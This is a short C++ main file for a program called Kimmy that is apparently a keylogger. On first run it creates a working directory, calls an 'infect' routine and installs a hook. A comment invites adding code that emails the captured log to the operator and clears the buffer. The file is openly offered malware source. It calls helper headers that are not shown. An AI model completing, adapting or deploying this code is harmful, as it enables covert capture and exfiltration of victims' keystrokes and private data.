//Kimmy.cpp
/*************************************include***********************************************/

#include "Set.h"
#include "Hook.h"
			
using namespace std;

/*******************************************************************************************/

int main()
{
	//Checking if Kimmy is installed
	bool IsInstalled = set -> Check();

	switch(IsInstalled)
		{
			case false: //first start
				{
					bool Ok = set -> WorkingDir();

					if(Ok)
					 {
					    set ->  infect();						 
					    hook -> SetHook();
					 }						
				}	
										
			case true:	//not first start		 
				{				
					/*here you can put a function that send your 
					log as email like:					

					 SendFilebufferAsEmail();
					 ResetBuffer(); IMPORTANT to reset the buffer (delete)

					 dont worry, the buffer will regenerate automatically */		

					hook -> SetHook();
					break;
				}

			default:
				{break;}
		}
}